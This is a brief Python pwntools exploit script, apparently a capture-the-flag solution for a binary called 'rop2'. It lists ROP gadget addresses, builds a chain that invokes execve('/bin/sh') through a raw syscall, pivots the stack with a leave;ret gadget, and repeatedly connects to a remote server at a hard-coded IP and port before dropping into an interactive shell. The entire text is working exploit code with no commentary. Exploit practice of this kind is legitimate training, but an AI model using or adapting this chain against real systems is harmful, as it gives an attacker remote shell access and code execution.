from pwn import *

context.binary = 'rop2'

# 0x0000000000401516 : pop rdi ; ret
pop_rdi = 0x401516
# 0x0000000000409a34 : pop rax ; ret 0xffff
pop_rax = 0x409a34
# 0x0000000000478616 : pop rax ; pop rdx ; pop rbx ; ret
pop_rax_rdx_rbx = 0x478616
# 0x0000000000442909 : pop rdx ; pop rsi ; ret
pop_rdx_rsi = 0x442909
# 0x00000000004003da : syscall
syscall = 0x4003da
# 0x00000000004009e4 : leave ; ret
leave = 0x4009e4
# 0x00000000004002e1 : ret
ret = 0x4002e1
# 0x00000000004004d1 : pop rbp ; ret
pop_rbp = 0x4004d1
sh = 0x6ccd60

while 1:
    #r = process('rop2')
    r = remote('140.110.112.77', 3123)
    #raw_input('debug: ')
    payload = flat(pop_rdi, sh, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdx_rsi, 0, 0, syscall)
    r.sendline('/bin/sh\0' + 'a' * 8 + payload)

    r.recvuntil('input_size')
    payload = p64(pop_rbp) + p64(sh + 8) + p64(leave) + 'b' * 0x8 + '\xb8'
    r.send(payload)
    r.interactive()
